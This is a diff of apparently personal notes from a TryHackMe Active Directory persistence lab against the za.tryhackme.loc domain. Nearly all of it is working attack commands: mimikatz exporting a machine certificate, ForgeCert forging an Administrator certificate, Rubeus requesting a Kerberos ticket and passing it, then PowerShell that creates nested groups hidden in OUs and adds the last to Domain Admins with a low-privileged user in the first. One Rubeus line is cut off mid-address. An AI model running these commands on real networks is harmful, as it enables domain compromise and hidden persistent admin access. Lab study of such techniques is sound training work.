@@ -290,12 +290,18 @@
           
           mimikatz # crypto::cng
           "KeyIso" service patched
-        mimikatz # crypto::certificates /systemstore:local_machine /export
-          .pfx is the cert file
-        ForgeCert.exe --CaCertPath c:\Users\grace.clarke\local_machine_My_0_.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword tryhackme 
-        Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:C:
-\Tools\ForgeCert\fullAdmin.pfx /password:tryhackme /outfile:my.kirbi /domain:za.tryhackme.loc /dc:10.50.6
-2.100
-        mimikatz # kerberos::ptt my.kirbi
-
-  
+          mimikatz # crypto::certificates /systemstore:local_machine /export
+            .pfx is the cert file
+          ForgeCert.exe --CaCertPath c:\Users\grace.clarke\local_machine_My_0_.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword tryhackme 
+          Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:C:\Tools\ForgeCert\fullAdmin.pfx /password:tryhackme /outfile:my.kirbi /domain:za.tryhackme.loc /dc:10.50.
+          mimikatz # kerberos::ptt my.kirbi
+        persistance by adding group member
+           //create some of our own groups. Let's start by creating a new base group that we will hide in the People->IT Organisational Unit (OU):
+          New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
+          //create another group in the People->Sales OU and add our previous group as a member:
+          New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security 
+          Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"
+          //nest a couple more groups,With the last group, add that group to the Domain Admins group
+          Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
+          //add our low-privileged AD user to the first group
+          Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
